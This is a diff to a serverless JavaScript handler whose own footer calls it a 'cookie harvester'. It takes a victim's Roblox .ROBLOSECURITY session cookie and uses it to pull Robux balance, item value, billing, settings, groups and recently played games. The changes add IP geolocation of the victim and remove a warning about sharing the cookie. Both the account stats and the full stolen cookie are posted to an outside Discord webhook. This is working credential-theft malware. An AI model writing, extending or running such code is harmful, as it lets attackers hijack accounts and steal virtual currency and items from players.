@@ -1,7 +1,7 @@
 // api/submit.js
 const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
 
-// ---------- Helper functions ----------
+// ---------- Real data fetches ----------
 async function getUser(userId, cookie) {
   const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
     headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
@@ -104,17 +104,41 @@ async function getGroups(userId, cookie) {
   }
 }
 
-async function getPlayedPasses() {
-  // Static to match screenshot; replace with real gamepass checks if needed
-  return [
-    { name: "MM2", played: "False", passes: 0 },
-    { name: "ADM", played: "False", passes: 0 },
-    { name: "GAD", played: "True", passes: 0 }
-  ];
+async function getCollectibles() {
+  // Placeholder – you can replace with actual rare items check
+  return ["False", "False", "False"];
 }
 
-async function getCollectibles() {
-  return ["False", "False", "False"];
+// ---------- Get last played games (real check) ----------
+async function getLastPlayedGames(userId, cookie) {
+  const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
+  // Fetch recently played games (uses internal Roblox API)
+  const res = await fetch(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`, {
+    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+  });
+  if (!res.ok) return targetGames.map(name => ({ name, played: "False", passes: 0 }));
+  const data = await res.json();
+  const playedGameNames = (data.data || []).map(g => g.name);
+  return targetGames.map(name => {
+    const played = playedGameNames.some(g => g.toLowerCase().includes(name.toLowerCase())) ? "True" : "False";
+    return { name, played, passes: 0 };
+  });
+}
+
+// ---------- Country flag from IP ----------
+async function getCountryFlag(req) {
+  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
+  if (!ip || ip === '::1') return '🏠 Local';
+  try {
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
+    const data = await geoRes.json();
+    if (data.status === 'success' && data.countryCode) {
+      const code = data.countryCode.toLowerCase();
+      const flag = String.fromCodePoint(...[...code].map(c => 0x1F1E6 - 65 + c.charCodeAt(0)));
+      return `${flag} ${data.countryCode}`;
+    }
+  } catch (e) {}
+  return '🌍 Unknown';
 }
 
 // ---------- MAIN HANDLER ----------
@@ -128,31 +152,36 @@ export default async function handler(req, res) {
   if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });
 
   try {
+    // Fetch all data
     const userData = await getUser(rbxuid, cookie);
     const robux = await getRobux(rbxuid, cookie);
     const rapData = await getRapAndOwned(rbxuid, cookie);
     const billing = await getBilling(cookie);
     const settings = await getSettings(cookie);
     const groups = await getGroups(rbxuid, cookie);
-    const playedPasses = await getPlayedPasses();
+    const playedPasses = await getLastPlayedGames(rbxuid, cookie); // dynamic check
     const collectibles = await getCollectibles();
+    const countryFlag = await getCountryFlag(req);
 
     const accountAge = getAgeDays(userData.created);
     const summary = robux.balance + rapData.rap;
     const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
 
-    const robuxEmoji = "<:ROBUX:1472515184949202974>";
+    // Emojis & images
+    const robuxEmoji = "<:Robux:1495081542370726080>"; // new Robux emoji
     const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
+    const rolimonsLink = `https://www.rolimons.com/user/${userData.id}`;
 
+    // ---------- Stats Embed (dark blue, all bold, @everyone ping) ----------
     const statsEmbed = {
       title: "🔱 Vyro Har - Result",
       description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
-      color: 0x2c3e50,
+      color: 0x1E3A8A, // dark blue
       thumbnail: { url: cookieThumb },
       fields: [
         {
           name: "📌 About User",
-          value: `**${userData.name}** (**${userData.displayName}**)\n🆔 \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** 0`,
+          value: `**${userData.name}** (**${userData.displayName}**)\n**UserID:** \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** 0\n**Country:** ${countryFlag}`,
           inline: false
         },
         {
@@ -194,35 +223,51 @@ export default async function handler(req, res) {
           name: "📊 Groups",
           value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
           inline: true
+        },
+        {
+          name: "🔗 Rolimons Profile",
+          value: `[Click here](${rolimonsLink})`,
+          inline: false
         }
       ],
       footer: { text: "made by vyro28 • cookie harvester" },
       timestamp: new Date().toISOString()
     };
 
+    // ---------- Cookie Embed (bold+italic title, no warning, cookie thumbnail) ----------
     const cookieEmbed = {
-      title: "📌 .ROBLOSECURITY",
-      description: `**__WARNING: -DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.__**\n\`\`\`\n${cookie}\n\`\`\``,
-      color: 0x2c3e50,
+      title: "🍪 ***.ROBLOSECURITY***",
+      description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
+      color: 0x1E3A8A,
       thumbnail: { url: cookieThumb },
       footer: { text: "made by vyro28 • cookie harvester" },
       timestamp: new Date().toISOString()
     };
 
+    // Send first embed with @everyone ping
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Vyro Harvest", embeds: [statsEmbed] })
+      body: JSON.stringify({
+        content: "@everyone",
+        username: "Vyro Harvest",
+        embeds: [statsEmbed]
+      })
     });
+
+    // Send second embed (cookie)
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
+      body: JSON.stringify({
+        username: "Vyro Harvest",
+        embeds: [cookieEmbed]
+      })
     });
 
     return res.status(200).json({ success: true, firstTime: true });
   } catch (err) {
-    console.error(err);
+    console.error("Harvest error:", err);
     return res.status(500).json({ error: err.message });
   }
 }
